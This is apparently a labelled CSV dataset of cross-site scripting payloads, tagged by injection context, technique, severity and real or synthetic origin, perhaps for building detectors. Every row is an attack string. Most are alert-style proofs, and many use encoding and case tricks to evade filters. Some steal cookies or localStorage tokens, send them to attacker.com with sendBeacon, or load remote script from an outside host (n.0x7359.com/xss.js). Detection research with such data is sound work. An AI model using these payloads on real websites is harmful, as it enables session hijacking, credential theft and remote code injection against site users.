payload,context,technique,severity,length,source
"EleMenT.sEtATtrIbuTe(""onCliCk"",""pRomPt(DocUmeNt.CooKie)"")",dom_sink,synthetic,high,57,synthetic
""" ><svg onwebkittransitionend=confirm(location.hash)>",attribute_escape,synthetic,medium,53,synthetic
<fieldset onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</fieldset>,tag_injection,none,medium,82,real
<br contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,56,real
"""%3E%3Cimg src=x onfocus=console.log(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,70,synthetic
' onselect=confirm(location.hash) ',attribute_escape,synthetic,medium,35,synthetic
&quot; ondragstart=console.log(location.hash) x=&quot;,attribute_escape,synthetic,medium,54,synthetic
<dialog src=x onpointerover=confirm(1)>,tag_injection,synthetic,medium,39,synthetic
"<th onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</th>",tag_injection,none,medium,66,real
"<output ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</output>",tag_injection,none,medium,93,real
"loc&#97;tion=""j&#97;v&#97;script:consol&#101;.log(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))""",dom_sink,synthetic,low,109,synthetic
"__proto__[""onb&#101;for&#101;toggl&#101;""]=XMLHttpR&#101;qu&#101;st(docum&#101;nt.dom&#97;in)",dom_sink,synthetic,high,93,synthetic
<element onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,69,real
"element.insertAdjacentHTML(""beforeend"",""%3Cimg src=x onerror=eval(btoa(document.cookie))%3E"")",dom_sink,synthetic,high,93,synthetic
'><img src=x onpointerrawupdate=\u0061lert(location.hash)>,attribute_escape,synthetic,low,58,synthetic
%u0025u0073u0063u0072u0069u0070u0074u003Ealert('AnonKryptiQuz')%u003C%u002f%u0073%u0063%u0072%u0069%u0070%u0074%u003E,generic,none,medium,117,real
%22 onkeypress=confirm(%27XSS%27) %22,attribute_escape,synthetic,medium,37,synthetic
' onbeforepaste=\u0061lert('XSS') ',attribute_escape,synthetic,low,35,synthetic
onmozfullscreenchange=console.log(document.domain),event_handler,synthetic,medium,50,synthetic
"<!--><Xmp onTouCheNd=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))>",tag_injection,synthetic,high,64,synthetic
' onfullscr&#101;&#101;nch&#97;ng&#101;=consol&#101;.log(1) ',attribute_escape,synthetic,low,61,synthetic
<input4 onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,68,real
"%22 ><svg onanimationcancel=console.log(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,71,synthetic
 onfocusout=prompt('XSS'),event_handler,synthetic,medium,25,synthetic
"<b&#97;s&#101;
oninput=&#97;l&#101;rt('XSS')>",tag_injection,synthetic,low,45,synthetic
"\%27 onrepeat=confirm(String.fromCharCode(88,83,83))//",attribute_escape,synthetic,high,54,synthetic
"""%3E%3Cimg src=x ondragenter=prompt(document.domain)%3E",attribute_escape,synthetic,medium,55,synthetic
"__proto__[""onpromptdismiss""]=consol&#101;.log(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))",dom_sink,synthetic,low,104,synthetic
<del onpointerup=alert(1) style=display:block>AnonKryptiQuz</del>,tag_injection,none,medium,65,real
OnpOinTerMovE=cOnsOle.loG/***/(1),event_handler,synthetic,low,33,synthetic
"'%3E%3Cimg src=x onbeforematch=prompt(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,71,synthetic
"\"" ondrop=confirm(loc&#97;tion.h&#97;sh)//",attribute_escape,synthetic,medium,42,synthetic
"?pg=javascript:alert(1)"",",js_uri,none,medium,25,real
`%3E%3Cimg src=x onclose=alert(document.domain)%3E,attribute_escape,synthetic,medium,50,synthetic
"<hgroup onmouseup=""alert(1)"">AnonKryptiQuz</hgroup>",tag_injection,none,medium,51,real
"""><Svg onProMptDisMisS=aLerT(lOcaTioN.hAsh)>",tag_injection,synthetic,medium,44,synthetic
""" ><svg onvolumechange=\u0061lert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,65,synthetic
 onanimationend=console.log('XSS'),event_handler,synthetic,medium,34,synthetic
"""><Img srC=x onPasTe=ConFirM('XSS')>",attribute_escape,synthetic,medium,36,synthetic
"<main onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</main>",tag_injection,none,medium,67,real
onrepeat=console.log(location.hash),event_handler,synthetic,medium,35,synthetic
`><img src=x ongotpointercapture=\u0061lert(document.domain)>,attribute_escape,synthetic,low,61,synthetic
"' ><svg onbeforematch=prompt(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,60,synthetic
"<s draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</s>",tag_injection,none,medium,80,real
%27 onwheel=console.log(document.domain) %27,attribute_escape,synthetic,medium,44,synthetic
`><img src=x ontr&#97;nsition&#101;nd=prompt(loc&#97;tion.h&#97;sh)>,attribute_escape,synthetic,medium,68,synthetic
<mtext/onfocusout=confirm(location.hash)>,tag_injection,synthetic,medium,41,synthetic
"';document.addEventListener('DOMContentLoaded', function(){var c = function(){a();};var s = document.createElement('script');s.src = 'https://n.0x7359.com/xss.js';s.onreadystatechange = c;document.body.appendChild(s);});//",dom_sink,none,low,222,real
<center onpointerover=alert(1) style=display:block>AnonKryptiQuz</center>,tag_injection,none,medium,73,real
 onrepeat=alert('XSS'),event_handler,synthetic,medium,22,synthetic
"""><s&#101;t on&#101;nd=&#97;l&#101;rt(1)>",tag_injection,synthetic,low,41,synthetic
<form onsubmit=alert(1)><input type=submit>,tag_injection,none,medium,43,real
"\""-alert(1)}//",generic,none,medium,14,real
%27 ongestureend=confirm(%27XSS%27) %27,attribute_escape,synthetic,medium,39,synthetic
<body onbeforecut=confirm(document.domain)/>,tag_injection,synthetic,medium,44,synthetic
<fieldset contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,62,real
`><img src=x onmous&#101;ov&#101;r=prompt(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,medium,68,synthetic
{{ alert(%27XSS%27) }},template_injection,synthetic,medium,22,synthetic
location.href=%22javascript:eval(document.cookie)%22,dom_sink,synthetic,high,52,synthetic
<form onp&#97;g&#101;hid&#101;=confirm(1)>,tag_injection,synthetic,medium,42,synthetic
 ondragover=prompt('XSS'),event_handler,synthetic,medium,25,synthetic
' ><svg onmozfullscr&#101;&#101;nch&#97;ng&#101;=&#97;l&#101;rt(1)>,attribute_escape,synthetic,low,67,synthetic
"""><script+src=""https://www.meteoprog.ua/data/weather/informer/Poltava.js?callback=alert(1337)""></script>",script_injection,none,medium,104,real
"<span draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</span>",tag_injection,none,medium,66,real
&{document.vulnerable=true;};,dom_sink,none,low,29,real
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=aLerT(nAviGatOr.SenDBeAcoN('//aTtaCkeR.cOm',doCumEnt.coOkiE))>"")",dom_sink,synthetic,high,99,synthetic
"<div draggable=""true"" contenteditable>drag me</div><blockquote ondrop=alert(1) contenteditable>drop here</blockquote>",tag_injection,none,medium,117,real
"__proto__[""onscroll&#101;nd""]=XMLHttpR&#101;qu&#101;st(docum&#101;nt.cooki&#101;)",dom_sink,synthetic,high,81,synthetic
<audio onpointermove=alert(1) style=display:block>AnonKryptiQuz</audio>,tag_injection,none,medium,71,real
"""><img src=x ongestureend=console.log(location.hash)>",attribute_escape,synthetic,medium,53,synthetic
" oninput=prompt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,medium,55,synthetic
"<! foo=""[[[Inception]]""><x foo=""]foo><script>alert(1)</script>"">",script_injection,none,medium,64,real
<tr x=y onanimationend=prompt(%27XSS%27)>,tag_injection,synthetic,medium,41,synthetic
%27 onmousedown=alert(location.hash) %27,attribute_escape,synthetic,medium,40,synthetic
""" ><svG oNprOmpTdiSmiSs=ConSolE.lOg('XSS')>",attribute_escape,synthetic,medium,43,synthetic
\%27 onended=console.log(document.domain)//,attribute_escape,synthetic,medium,43,synthetic
%27><img src=x onended=alert(1)>,attribute_escape,synthetic,medium,32,synthetic
onpointermove=\u0061lert('XSS'),event_handler,synthetic,low,31,synthetic
"Obj&#101;ct.&#97;ssign(window,{""on&#97;uxclick"":f&#101;tch})",dom_sink,synthetic,low,60,synthetic
<obJecT sRc=X oNtoUchStaRt=ConSolE.lOg(LocAtiOn.HasH)>,tag_injection,synthetic,medium,54,synthetic
' oNseCurItyPolIcyVioLatIon=prOmpT(1) ',attribute_escape,synthetic,medium,39,synthetic
onfocus=j&#97;v&#97;script:&#97;l&#101;rt(loc&#97;tion.h&#97;sh),event_handler,synthetic,low,64,synthetic
document.querySelector(%22body%22).innerHTML+=%22fetch(btoa(document.cookie))%22,dom_sink,synthetic,high,80,synthetic
"<style>@keyframes slidein {}</style><mark style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></mark>",tag_injection,none,medium,168,real
"<style>@keyframes slidein {}</style><img style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></img>",tag_injection,none,medium,166,real
"<source onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></source>",tag_injection,none,medium,285,real
<im&#97;g&#101; src=x onch&#97;ng&#101;=&#97;l&#101;rt(1)>,tag_injection,synthetic,low,58,synthetic
"<style>@keyframes slidein {}</style><dl style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></dl>",tag_injection,none,medium,164,real
"<script draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</script>",script_injection,none,medium,88,real
<data id=x tabindex=1 ondeactivate=alert(1)></data><input id=y autofocus>,tag_injection,none,medium,73,real
"j&#97;vascr	ipt:prompt(String.fromCharCode(88,83,83))",js_uri,synthetic,high,53,synthetic
"<sourc&#101;	onvolum&#101;ch&#97;ng&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,90,synthetic
&#X003c,generic,html_entity,low,7,real
"	onpointerover=prompt(String.fromCharCode(88,83,83))",event_handler,synthetic,high,52,synthetic
"<ruby id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></ruby>",tag_injection,none,medium,84,real
"SetTimEouT(""ConFirM(1)"",0)",dom_sink,synthetic,medium,26,synthetic
&quot; ontoggl&#101;=confirm('XSS') x=&quot;,attribute_escape,synthetic,medium,44,synthetic
"<style>@keyframes slidein {}</style><td style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></td>",tag_injection,none,medium,164,real
<set onwebkitfullscreenchange=console.log('XSS')/>,tag_injection,synthetic,medium,50,synthetic
"<;HEAD>;<;META HTTP-EQUIV="";CONTENT-TYPE""; CONTENT="";text/html; charset=UTF-7"";>; <;/HEAD>;+ADw-SCRIPT+AD4-alert(';XSS';);+ADw-/SCRIPT+AD4-",event_handler,none,medium,139,real
"%27 ><svg onkeypress=console.log(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,64,synthetic
' ong&#101;stur&#101;&#101;nd=consol&#101;.log('XSS') ',attribute_escape,synthetic,low,55,synthetic
"<menuitem oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</menuitem>",tag_injection,none,medium,68,real
"OnmOusEenTer=jaVasCriPt:AleRt(StrIng.frOmCHarCodE(88,83,83))",event_handler,synthetic,high,60,synthetic
'%3E%3Cimg src=x onend=confirm('XSS')%3E,attribute_escape,synthetic,medium,40,synthetic
<svg/onpromptdismiss=alert(location.hash)>,tag_injection,synthetic,medium,42,synthetic
<var onpointerup=alert(1) style=display:block>AnonKryptiQuz</var>,tag_injection,none,medium,65,real
"<q oncontextmenu=""alert(1)"">AnonKryptiQuz</q>",tag_injection,none,medium,45,real
"<spacer onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></spacer>",tag_injection,none,medium,285,real
"<boDy X=y onGesTurEstArt=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection,synthetic,high,68,synthetic
"LocAtiOn=""jaVasCriPt:ConSolE.lOg(DocUmeNt.DomAin)""",dom_sink,synthetic,high,50,synthetic
<script>Function(%27console.log(document.domain)%27)();</script>,script_injection,synthetic,medium,64,synthetic
"""%3E%3Cimg src=x onanimationstart=alert(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,73,synthetic
"__proto__[""ons&#101;curitypolicyviol&#97;tion""]=&#97;l&#101;rt(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))",dom_sink,synthetic,low,163,synthetic
""" ><svg oninv&#97;lid=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>",attribute_escape,synthetic,low,63,synthetic
"<style>:target {color: red;}</style><option id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></option>",tag_injection,none,medium,115,real
%3Ctitle onclick=confirm('XSS')/%3E,tag_injection,synthetic,medium,35,synthetic
"element.insertAdjacentHTML(%22beforeend%22,%22<img src=x onerror=console.log(document.cookie)>%22)",dom_sink,synthetic,high,98,synthetic
<liStiNg/OnkEyuP=aLerT(lOcaTioN.hAsh)>,tag_injection,synthetic,medium,38,synthetic
"LocAtiOn=""jaVasCriPt:EvaL(lOcaLStOraGe.GetIteM('TokEn'))""",dom_sink,synthetic,high,57,synthetic
"["" <style>@KeyFrames z{</style><div style=animation-name:z onanimationend=&#97&#108&#101&#114&#116&grave;1&grave;> %253Cscript%253Ealert('AnonKryptiQuz')%253C%252Fscript%253E ""</script> ""]",tag_injection,html_entity|url_encoding,medium,188,real
<span	onsecuritypolicyviolation=\u0061lert(location.hash)>,tag_injection,synthetic,low,58,synthetic
OngOtpOinTerCapTurE=pRomPt(LocAtiOn.HasH),event_handler,synthetic,medium,41,synthetic
"<script y=""><"">/*<script* */prompt()</script",script_injection,comment_injection,medium,44,real
{php}\u0061lert(document.cookie){/php},template_injection,synthetic,high,38,synthetic
OnkEydOwn=coNsoLe.Log&#40;dOcuMenT.dOmaIn&#41;,event_handler,synthetic,low,46,synthetic
&quot; ondrop=confirm(1) x=&quot;,attribute_escape,synthetic,medium,33,synthetic
"location=""javascript:\u0061lert(document.domain)""",dom_sink,synthetic,high,49,synthetic
<img src=x onk&#101;ypr&#101;ss=consol&#101;.log(1)>,tag_injection,synthetic,low,52,synthetic
<arEa	OncLosE=pRomPt(1)>,tag_injection,synthetic,medium,24,synthetic
OnpAstE=jAvaScrIpt:alErt(1),event_handler,synthetic,medium,27,synthetic
<iframe2 onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,58,real
""" ><svg ong&#101;stur&#101;st&#97;rt=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",attribute_escape,synthetic,low,75,synthetic
%3Ctitle/onblur=console.log(location.hash)%3E,tag_injection,synthetic,medium,45,synthetic
 onk&#101;yup=confirm(loc&#97;tion.h&#97;sh),event_handler,synthetic,medium,44,synthetic
`><img src=x onbeforecopy=prompt(location.hash)>,attribute_escape,synthetic,medium,48,synthetic
"""><Td OnkEyuP=cOnfIrm(doCumEnt.doMaiN)>",tag_injection,synthetic,medium,39,synthetic
"%27 ><svg ondblclick=console.log(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,64,synthetic
<&#97;r&#101;&#97; onpoint&#101;rc&#97;nc&#101;l=consol&#101;.log(docum&#101;nt.dom&#97;in) onpoint&#101;rc&#97;nc&#101;l=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,low,165,synthetic
<tr/onfocus=confirm('XSS')>,tag_injection,synthetic,medium,27,synthetic
\' OnmOusEovEr=ConFirM('XSS')//,attribute_escape,synthetic,medium,31,synthetic
%27><img src=x onwebkitanimationend=confirm(%27XSS%27)>,attribute_escape,synthetic,medium,55,synthetic
`><Img srC=x onBegIn=ConFirM(lOcaTioN.hAsh)>,attribute_escape,synthetic,medium,44,synthetic
onbeforetoggle=alert/**/(location.hash),event_handler,synthetic,low,39,synthetic
"setInterval(%22prompt(location.hash)%22,100)",dom_sink,synthetic,high,44,synthetic
"s = '""><script>alert(1)</script>' print 'eval(String.fromCharCode('+"","".join([str(ord(o)) for o in s])+'))'",dom_sink,encoding,high,107,real
"<code onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</code>",tag_injection,none,medium,69,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><image id=x style=""position:absolute;"" onanimationcancel=""print()""></image>",tag_injection,none,low,179,real
<code onfocusout=alert(1) tabindex=1 id=x></code><input autofocus>,tag_injection,none,medium,66,real
 onpopstate=confirm(%27XSS%27),event_handler,synthetic,medium,30,synthetic
%3Ctd x=y onwebkitanimationend=prompt('XSS')%3E,tag_injection,synthetic,medium,47,synthetic
%27 ><svg oncanplay=console.log(location.hash)>,attribute_escape,synthetic,medium,47,synthetic
"<style>@keyframes x{}</style><rp style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></rp>",tag_injection,none,medium,97,real
ongesturestart=console.log&#40;location.hash&#41;,event_handler,synthetic,low,49,synthetic
"<spacer onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</spacer>",tag_injection,none,medium,85,real
<button popovertarget=x>Click me</button><q ontoggle=alert(1) popover id=x>AnonKryptiQuz</q>,tag_injection,none,medium,92,real
"<th onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</th>",tag_injection,none,medium,77,real
' on&#97;nim&#97;tionit&#101;r&#97;tion=confirm('XSS') ',attribute_escape,synthetic,medium,56,synthetic
%3Csvg onbeforecopy=prompt(document.domain) onbeforecopy=prompt(document.domain)%3E,tag_injection,synthetic,medium,83,synthetic
%27><img src=x oncopy=console.log(1)>,attribute_escape,synthetic,medium,37,synthetic
<animate onpageshow=console.log(%27XSS%27)/>,tag_injection,synthetic,medium,44,synthetic
onk&#101;ydown=prompt(loc&#97;tion.h&#97;sh),event_handler,synthetic,medium,44,synthetic
"\"" on&#97;nim&#97;tionit&#101;r&#97;tion=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape,synthetic,low,97,synthetic
""" ontouchmov&#101;=consol&#101;.log('XSS') """,attribute_escape,synthetic,low,44,synthetic
<title id=x tabindex=1 onactivate=alert(1)></title>,tag_injection,none,medium,51,real
"__proto__[""onpointerrawupdate""]=prompt(btoa(document.cookie))",dom_sink,synthetic,high,61,synthetic
	onmous&#101;ov&#101;r=confirm(docum&#101;nt.dom&#97;in),event_handler,synthetic,medium,56,synthetic
<!--><&#97;nim&#97;t&#101;motion ong&#101;stur&#101;st&#97;rt=confirm(1)>,tag_injection,synthetic,medium,73,synthetic
%22 ><svg ongotpointercapture=confirm(location.hash)>,attribute_escape,synthetic,medium,53,synthetic
"<IMG SRC=x onresize=""alert(String.fromCharCode(88,83,83))"">",tag_injection,encoding|case_variation,high,59,real
"<area onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</area>",tag_injection,none,medium,68,real
onpause=prompt/*x*/(location.hash),event_handler,synthetic,low,34,synthetic
%27 ><svg onreset=console.log(%27XSS%27)>,attribute_escape,synthetic,medium,41,synthetic
"document.write(""<img src=x onerror=console.log(btoa(document.cookie))>"")",dom_sink,synthetic,high,72,synthetic
"%3Cplaintext
ontouchstart=alert(1)%3E",tag_injection,synthetic,medium,37,synthetic
"__proto__[""on&#97;uxclick""]=XMLHttpR&#101;qu&#101;st(docum&#101;nt.dom&#97;in)",dom_sink,synthetic,high,78,synthetic
"<output onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</output>",tag_injection,none,medium,88,real
"<footer onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</footer>",tag_injection,none,medium,65,real
""" %3E%3Csvg onbeforetoggle=alert(location.hash)%3E",attribute_escape,synthetic,medium,50,synthetic
"""><Img srC=x onWheEl=ConSolE.lOg(LocAtiOn.HasH)>",attribute_escape,synthetic,medium,48,synthetic
"""><Img srC=x onErrOr=ConFirM(STriNg.FroMChArCOde(88,83,83))>",attribute_escape,synthetic,high,60,synthetic
"element.setAttribute(""onclick"",""eval(document.cookie+'&loc='+location.href)"")",dom_sink,synthetic,high,77,synthetic
"<div draggable=""true"" contenteditable>drag me</div><ul ondrop=alert(1) contenteditable>drop here</ul>",tag_injection,none,medium,101,real
"Obj&#101;ct.&#97;ssign(window,{""on&#97;nim&#97;tionst&#97;rt"":&#97;l&#101;rt})",dom_sink,synthetic,low,78,synthetic
"d&#97;t&#97;:t&#101;xt/html,<script>consol&#101;.log(loc&#97;tion.h&#97;sh)</script>",js_uri,synthetic,low,84,synthetic
"<script onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</script>",script_injection,none,medium,74,real
"<viDeo
onMozFulLscReeNchAngE=pRomPt('XSS')>",tag_injection,synthetic,medium,43,synthetic
\%22 onscrollsnapchange=confirm(%27XSS%27)//,attribute_escape,synthetic,medium,44,synthetic
"""><script>alert('XSS')</script>",script_injection,none,medium,31,real
""" onmous&#101;wh&#101;&#101;l=&#97;l&#101;rt(docum&#101;nt.dom&#97;in) """,attribute_escape,synthetic,low,72,synthetic
<!--><img onk&#101;ypr&#101;ss=consol&#101;.log(1)>,tag_injection,synthetic,low,51,synthetic
"<xmp onfocusout=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) onfocusout=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,121,synthetic
%22 onselect=prompt(1) %22,attribute_escape,synthetic,medium,26,synthetic
`><img src=x ons&#101;l&#101;ct=confirm(loc&#97;tion.h&#97;sh)>,attribute_escape,synthetic,medium,63,synthetic
"__proto__[""onk&#101;ypr&#101;ss""]=XMLHttpR&#101;qu&#101;st(1)",dom_sink,synthetic,high,61,synthetic
"Obj&#101;ct.&#97;ssign(window,{""onmous&#101;&#101;nt&#101;r"":confirm})",dom_sink,synthetic,low,70,synthetic
"%3Cp onbeforetoggle=alert(String.fromCharCode(88,83,83)) onbeforetoggle=alert(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,111,synthetic
<script>window['&#97;l&#101;rt'](1)</script>,script_injection,synthetic,low,44,synthetic
<style onload=alert(1)></style>,tag_injection,none,medium,31,real
"`><img src=x onclose=prompt(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,59,synthetic
%27 ongestureend=console.log(location.hash) %27,attribute_escape,synthetic,medium,47,synthetic
`><img src=x onpoint&#101;rmov&#101;=confirm(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,medium,71,synthetic
"<optgroup onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</optgroup>",tag_injection,none,medium,69,real
' ><svG oNkeYprEss=alErt(1)>,attribute_escape,synthetic,medium,28,synthetic
%3Cmath/onscrollend=prompt(document.domain)%3E,tag_injection,synthetic,medium,46,synthetic
"<map id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></map>",tag_injection,none,medium,82,real
"""><img src=x ong&#101;stur&#101;&#101;nd=confirm(loc&#97;tion.h&#97;sh)>",attribute_escape,synthetic,medium,72,synthetic
"Obj&#101;ct.&#97;ssign(window,{""ondr&#97;gov&#101;r"":f&#101;tch})",dom_sink,synthetic,low,65,synthetic
"<iframe2 oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,101,real
<img src='AnonKryptiQuz' onmouseover='alert(2)'>,tag_injection,none,medium,48,real
"<div draggable=""true"" contenteditable>drag me</div><tr ondragover=alert(1) contenteditable>drop here</tr>",tag_injection,none,medium,105,real
&quot; onbeforepaste=console.log(%27XSS%27) x=&quot;,attribute_escape,synthetic,medium,52,synthetic
"<shadow onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</shadow>",tag_injection,none,medium,69,real
"element.setAttribute(%22onclick%22,%22fetch(String.fromCharCode(88,83,83))%22)",dom_sink,synthetic,high,78,synthetic
onwebkitfullscreenchange=prompt/***/(%27XSS%27),event_handler,synthetic,low,47,synthetic
%22 ><svg onmousedown=confirm(document.domain)>,attribute_escape,synthetic,medium,47,synthetic
<select onchange=alert(1)><option>1<option>2,tag_injection,none,medium,44,real
<anImaTetRanSfoRm Src=x OnpOinTerMovE=cOnsOle.loG('XSS')>,tag_injection,synthetic,medium,57,synthetic
""" ><svg on&#97;uxclick=prompt(loc&#97;tion.h&#97;sh)>",attribute_escape,synthetic,medium,53,synthetic
""" ><svG oNfuLlsCreEncHanGe=AleRt(LocAtiOn.HasH)>",attribute_escape,synthetic,medium,48,synthetic
<anImaTe Src=x OnfOcuS=cOnsOle.loG(dOcuMenT.dOmaIn)>,tag_injection,synthetic,medium,52,synthetic
&#39;-alert(1)-&#39;,generic,html_entity,medium,20,real
<mtext src=x onstalled=console.log(document.domain)>,tag_injection,synthetic,medium,52,synthetic
"__proto__[""onpointerdown""]=\u0061lert(document.domain)",dom_sink,synthetic,low,54,synthetic
"<style>:target {color: red;}</style><dd id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></dd>",tag_injection,none,medium,107,real
onpointerrawupdate=console.log(1),event_handler,synthetic,medium,33,synthetic
"%22 oninvalid=prompt(String.fromCharCode(88,83,83)) %22",attribute_escape,synthetic,high,55,synthetic
' onwh&#101;&#101;l=prompt('XSS') ',attribute_escape,synthetic,medium,35,synthetic
"<style>:target {transform: rotate(180deg);}</style><p id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></p>",tag_injection,none,medium,120,real
'><img src=x ontransitionend=\u0061lert(document.domain)>,attribute_escape,synthetic,low,57,synthetic
<iframe onsecuritypolicyviolation=confirm(%27XSS%27)/>,tag_injection,synthetic,medium,54,synthetic
javascript:%0aconsole.log(%27XSS%27),js_uri,synthetic,medium,36,synthetic
`><img src=x onpromptdismiss=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,low,70,synthetic
<base src=x onpageswap=alert(%27XSS%27)>,tag_injection,synthetic,medium,40,synthetic
javascr	ipt:%0aconfirm(1),js_uri,synthetic,medium,25,synthetic
' ><svg on&#97;nim&#97;tionit&#101;r&#97;tion=consol&#101;.log('XSS')>,attribute_escape,synthetic,low,70,synthetic
 onclose=console.log('XSS'),event_handler,synthetic,medium,27,synthetic
"<form><iframe &#09;&#10;&#11; src=""javascript&#58;alert(8045)""&#11;&#10;&#09;;>",generic,html_entity|whitespace_obfuscation,medium,79,real
"docum&#101;nt.qu&#101;ryS&#101;l&#101;ctor(""body"").inn&#101;rHTML+=""consol&#101;.log('XSS')""",dom_sink,synthetic,low,92,synthetic
"loc&#97;tion.hr&#101;f=""j&#97;v&#97;script:XMLHttpR&#101;qu&#101;st(1)""",dom_sink,synthetic,high,71,synthetic
"<nobr onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</nobr>",tag_injection,none,medium,83,real
"element.setAttribute(%22onclick%22,%22fetch(btoa(document.cookie))%22)",dom_sink,synthetic,high,70,synthetic
(new Function(%22confirm(btoa(document.cookie))%22))();,dom_sink,synthetic,high,55,synthetic
